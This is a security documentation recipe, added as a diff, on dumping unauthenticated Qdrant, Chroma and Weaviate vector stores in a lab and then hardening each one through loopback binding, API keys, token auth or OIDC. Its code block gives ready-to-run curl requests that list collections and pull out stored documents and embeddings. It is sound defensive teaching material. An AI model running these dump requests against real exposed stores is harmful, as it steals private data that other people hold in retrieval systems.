@@ -1,0 +1,253 @@
+---
+title: "Recipe: rip an unauthenticated vector store, then close all three"
+toc-title: Recipe
+---
+
+| Field | Value |
+|---|---|
+| Tools | `vector-db-ripper` (A-7, exp) ↔ `qdrant` / `chromadb` / `weaviate` (O-3 rows) + hardening rows |
+| Section | Attack–defence pairs |
+| Level | medium |
+| Time | ~45 min (three boot postures + three probe sweeps + flips) |
+| Layer/Category | ATTACK / A-7 + OPS / O-3 ↔ DEFENCE / d-01 (pending rows) |
+| Tags | `pair`, `platform`, `vector-db`, `qdrant`, `chromadb`, `weaviate`, `exp`, `owasp-llm02`, `owasp-llm10` |
+
+## Problem
+
+A vector store is where an LLM deployment keeps its memory — the
+embeddings that back retrieval, and everything ingested beside them.
+All three manifest stores can stand up with that memory readable by
+anyone who reaches the port: Qdrant lists collections and scrolls
+points (records plus vectors) with no credential layer out of the
+box — upstream's security page in one line: "By default, all
+self-deployed Qdrant instances are not secure"; Chroma's collection
+`get` shape dumps records over the current official
+`/api/v2/tenants/{tenant}/databases/{db}/collections` surface when
+the server runs without auth; Weaviate serves full schema and object
+dumps with vectors (`include=classification,vector`) under anonymous
+access — a posture upstream calls "strongly discouraged except for
+development". The manifest maps the lane to OWASP LLM02 + LLM10 and
+the `vector-db-ripper` row to ATLAS AML.T0049 + T0050 + T0057. The
+kailash twist is per-store: the NixOS `services.qdrant` module
+already binds 127.0.0.1 and disables telemetry BY DEFAULT (the lab
+posture is the OPERATOR override), `services.chromadb` likewise
+defaults to host 127.0.0.1 with no auth option at the pin, and
+Weaviate is a docker-wrapper Shape-3 row (`podman`, `autoStart=false`,
+`semitechnologies/weaviate:1.39.2`) — so the exposed lab posture for
+that store is simply turning the backend ON. You want one recipe that
+demonstrates all three dumps against lab-booted targets, then proves
+each store's own hardening closes it.
+
+## Solution
+
+Three boots, three sweeps, three flips — one shared discipline
+(every probe a plain curl with a verdict; never a fabricated PASS):
+
+```bash
+# ── QDRANT LEG ──────────────────────────────────────────────────────
+# 1. THE EXPOSED POSTURE IS THE OVERRIDE (the flip of the usual story:
+#    the NixOS module default is host mkDefault 127.0.0.1 +
+#    telemetry_disabled; the lab override to 0.0.0.0 is the deliberate
+#    act, run in an isolated lab segment):
+#      services.qdrant.host = "0.0.0.0";   # lab override
+#    (upstream's own config file defaults service.host to 0.0.0.0 —
+#     bare-container deployments are the exposure this recipe rehearses)
+
+# 2. ENUMERATE + DUMP (verified shapes):
+curl -fsS http://<qdrant>:6333/collections
+#    -> {"result":{"collections":[{"name":"<c>"}, ...]}}
+curl -fsS http://<qdrant>:6333/collections/<c>
+#    -> collection info (vector dims, points_count)
+curl -fsS -X POST http://<qdrant>:6333/collections/<c>/points/scroll \
+     -H 'Content-Type: application/json' \
+     -d '{"limit":256,"with_payload":true,"with_vector":true}'
+#    -> the points page: payloads (documents!) AND raw vectors
+curl -fsS http://<qdrant>:6333/collections/<c>/points/<id>
+#    -> one point, payload + vector
+curl -fsS http://<qdrant>:6333/metrics   # or /telemetry, /healthz, /livez, /readyz
+#    -> the telemetry half — server internals, no key
+
+# 3. QDRANT FLIP — back to the module default (127.0.0.1, telemetry off):
+sudo nixos-rebuild test
+#    same sweeps -> FAIL (refused) from the segment. The module default
+#    carries the fix. For a store that MUST stay reachable, the
+#    upstream key layer is the residual control:
+#      QDRANT__SERVICE__API_KEY=<strong-key>      # gates the whole API
+#      QDRANT__SERVICE__READ_ONLY_API_KEY=<ro-key> # read-scoped role
+#    + audit logging on for the operator's evidence trail.
+
+# ── CHROMA LEG ──────────────────────────────────────────────────────
+# 4. BOOT + DUMP (the module defaults host 127.0.0.1 with NO auth
+#    option at the pin: the exposed leg is the override inside the
+#    lab segment, mirroring the qdrant leg):
+#      services.chromadb.host = "0.0.0.0";   # lab override
+#    (or `chroma run --path /data` bare — port 8000; the current
+#     official API is the /api/v2/tenants/{tenant}/databases/{db}/
+#     collections surface over default_tenant/default_database)
+curl -fsS 'http://<chroma>:8000/api/v2/tenants/default_tenant/databases/default_database/collections'
+#    -> [{"id":"<uuid>","name":"<c>"}, ...]
+curl -fsS -X POST 'http://<chroma>:8000/api/v2/tenants/default_tenant/databases/default_database/collections/<collectionId>/get' \
+     -H 'Content-Type: application/json' \
+     -d '{"limit":256,"include":["documents","metadatas","embeddings"]}'
+#    -> the records dump: documents, metadata, embeddings — the LLM02
+#       evidence in one response
+
+# 5. CHROMA FLIP — module default (loopback):
+sudo nixos-rebuild test
+#    same sweeps -> FAIL (refused). Residual control for a store that
+#    must stay reachable — upstream token auth:
+#      CHROMA_SERVER_AUTHN_PROVIDER=
+#        "chromadb.auth.token_authn.TokenAuthenticationServerProvider"
+#      (+ token header config per upstream docs) — then the same GET
+#      without the credential FAILs with 401/403.
+
+# ── WEAVIATE LEG ────────────────────────────────────────────────────
+# 6. BOOT = TURNING THE BACKEND ON (docker-wrapper row, Shape 3 —
+#    podman, autoStart=false, pin semitechnologies/weaviate:1.39.2;
+#    the container boots WITHOUT auth modules = anonymous access,
+#    "strongly discouraged except for development" upstream):
+curl -fsS http://<weaviate>:8080/v1/meta    # server + module build
+curl -fsS http://<weaviate>:8080/v1/schema
+#    -> full class schema (the store's shape)
+curl -fsS 'http://<weaviate>:8080/v1/objects?class=<C>&limit=100&include=classification,vector'
+#    -> object dump incl. vectors + classification — the rip
+curl -fsS http://<weaviate>:8080/v1/nodes    # cluster/node view
+curl -fsS http://<weaviate>:8080/.well-known/openid-configuration
+#    -> 404/absent when anonymous — the OIDC layer is the closed-state hint
+
+# 7. WEAVIATE FLIP — the container comes back up AUTHENTICATED:
+#    (the Shape-3 boot is configuration: env on the container run —
+#     per the podman wrapper module, plus the upstream AUTH block)
+#      ENABLE_AUTHENTICATION=true (or the OIDC module envs:
+#      AUTHENTICATION_OIDC_ENABLED=true + issuer/client config)
+#    same sweeps -> 401/403. OIDC on closes anonymous access; keep the
+#    container loopback-published / lab-segmented besides.
+```
+
+Expected output shape (abridged, shapes not transcripts):
+
+```
+QDRANT   @ :6333  exposed leg (host 0.0.0.0 override)
+  /collections -> ok  /collections/<c>/points/scroll -> ok (payloads+vectors)
+  /metrics     -> ok  /healthz,/livez,/readyz -> ok
+  flip (module default) -> all probes FAIL (refused); API-key leg
+                           (QDRANT__SERVICE__API_KEY) -> 401 without key
+CHROMA   @ :8000  exposed leg (host override)
+  /api/v2/.../collections -> ok (list)
+  /api/v2/.../<id>/get   -> ok (documents+metadatas+embeddings)
+  flip (module default)  -> FAIL (refused); token-auth leg -> 401/403
+WEAVIATE @ :8080  exposed leg (backend on, anonymous)
+  /v1/meta,/v1/schema -> ok  /v1/objects?...include=vector -> ok
+  flip (auth on)      -> all probes 401/403; /.well-known/openid-... -> ok
+```
+
+## Discussion
+
+- **One recipe, three stores: the point is the shared shape of the
+  failure.** All three ships answer "records + vectors, unauthenti-
+  cated" over a plain HTTP GET/POST; all three close with one
+  deliberate posture (bind, or auth layer, or backend toggle). Once
+  you have walked all three, an unknown vector store on the segment
+  is an hour's work to classify: probe `/collections`-class shapes,
+  the `/api/v2` collection get, the `/v1/objects` dump — the rip
+  patterns rhyme.
+- **Why plain curl and not a bespoke exploit script:** `vector-db-ripper`
+  is an A-7 row, `safety.level: exp`, licence `LicenseRef-Unknown`,
+  upstream repository missing at the pin
+  ([kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)).
+  The probe legs run the verified shapes above; the real tool takes
+  over via the double-key lab gate when its derivation lands (walk:
+  [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html)).
+- **The kailash-defaults nuance is per-store and matters:** the qdrant
+  NixOS module hardens by default (host `mkDefault` 127.0.0.1,
+  telemetry_disabled) — the lab posture is the operator override, and
+  the recipe's flip leg restores the default. Chroma's module mirrors
+  it (host 127.0.0.1 default, no auth option at the pin — bind is the
+  only lever the module carries today; the token-auth env block is
+  upstream, quoted as the design). Weaviate is the one store where
+  the module itself does not bind anything (docker-wrapper Shape 3,
+  autoStart=false): the lab posture is turning the backend ON, so
+  boot it in a lab segment and publish it loopback-only. The general
+  story — "kailash hardens the store by default" — is FALSE for
+  weaviate's container and imprecise for chroma's auth; the per-store
+  facts are the ones that protect you.
+- **Hardening is layered per store, not one knob:** qdrant:
+  `QDRANT__SERVICE__API_KEY` + `QDRANT__SERVICE__READ_ONLY_API_KEY`
+  (read-scoped credentials for the retrieval path) + audit logging
+  on. chroma: `CHROMA_SERVER_AUTHN_PROVIDER` token provider (+ `401`
+  shape verified) — note it is server-side optional auth, so the bind
+  remains part of the posture. weaviate: OIDC anonymous-off
+  (`ENABLE_AUTHENTICATION` or the OIDC module envs, per the 1.39.2
+  pin's docs) plus the loopback publish. Bind + credential layer is
+  the pattern; a credential layer alone on an any-interface bind
+  repeats the vLLM mistake (key on the API, port still open).
+- **The guardrail/monitoring defence leg is a pending row, stated
+  honestly:** there is no d-01 request-scanner row for vector-store
+  traffic at the pin (the NeMo/llm-guard class — see the ollama pair
+  for those pending shapes); what the manifest does own for this
+  lane's telemetry is the d-02 OTel/monitoring direction (langfuse /
+  phoenix rows, module wiring PENDING — see the vllm and triton
+  pairs for those shapes). The evidence trail for a rip attempt today
+  is the store's own audit/log surface (qdrant's audit logging, the
+  container logs for chroma/weaviate) plus segment flow logs.
+- **ATLAS mapping, per row:** AML.T0049+T0050 (like the sibling A-7
+  rows) plus **T0057** for vector-db-ripper specifically — the data-
+  handling technique behind the rip. OWASP LLM02 (sensitive info
+  disclosure) carries the "memory exfiltration" framing; LLM10 the
+  unrestricted-consumption framing.
+- **This is the transferable pattern** (three lab targets → sweeps →
+  flips → diffs). Origin walk with the verdict instrument:
+  [Attack the platform, then verify](attack-then-verify.html).
+
+## See also
+
+- [Attack the platform, then verify](attack-then-verify.html) — the
+  mlflow pair; the verdict + record discipline this recipe follows
+- [Serve a local model for scanning](../ops/serve-a-model.html) —
+  the model-surface analog; the same lab-segment discipline
+- [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html) — the exp gate the real tool
+  rides when its derivation lands
+- Upstream surfaces: Qdrant:
+  <https://github.com/qdrant/qdrant/blob/master/docs/REST.md> ·
+  Qdrant security page
+  <https://qdrant.tech/documentation/security/> · Chroma:
+  <https://docs.trychroma.com/> · Weaviate auth:
+  <https://docs.weaviate.io/weaviate/configuration/authentication>
+- Upstream missing-repository note:
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+- [Recipe directory](../directory.html)
+
+---
+
+**Recipe provenance.** Manifest facts (A-7 `vector-db-ripper` row
+exp + `LicenseRef-Unknown`, ATLAS AML.T0049 + T0050 + T0057, OWASP
+LLM02 + LLM10 both epochs; qdrant/chromadb/weaviate O-3 rows;
+services.qdrant module default host mkDefault 127.0.0.1 +
+telemetry_disabled; services.chromadb host 127.0.0.1 default, no
+auth option at the pin; weaviate docker-wrapper backend podman
+autoStart=false pin semitechnologies/weaviate:1.39.2 Shape 3) are
+from the packages manifest rows + lane comments, verified
+2026-10-14. Upstream shapes checked at the pin: qdrant REST
+(/collections, /collections/{name}/points/scroll,
+/collections/{name}/points/{id}, snapshots, /metrics-/telemetry-
+/healthz-/livez-/readyz; "By default, all self-deployed Qdrant
+instances are not secure" verbatim from upstream's security page;
+QDRANT__SERVICE__API_KEY + read_only_api_key + audit logging),
+chroma current official API
+(/api/v2/tenants/{tenant}/databases/{db}/collections over
+default_tenant/default_database; the older /api/v1 paths NOT used;
+`chroma run --path`, port 8000; POST …/{collectionId}/get records
+dump; optional server auth via CHROMA_SERVER_AUTHN_PROVIDER token
+provider), weaviate (/v1/schema, /v1/schema/{class}, /v1/objects?
+class=&limit=&include=classification,vector, POST /v1/batch/objects,
+/v1/meta, /v1/nodes, /.well-known/openid-configuration; anonymous
+access "strongly discouraged except for development" verbatim; the
+1.39.2-pin docker-wrapper Shape-3 boot + auth env posture) —
+verified 2026-10-14. The probe legs above are request shapes; the
+exposed-leg boots are operator lab acts in isolated segments. d-01
+request-scanner module rows for this lane: PENDING-kailash.
+
+
+ref: [Qdrant/Chroma/Weaviate upstream docs + packages manifest rows](https://qdrant.tech/documentation/security/) - verified 2026-10-14. Missing A-7 repo: [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23).
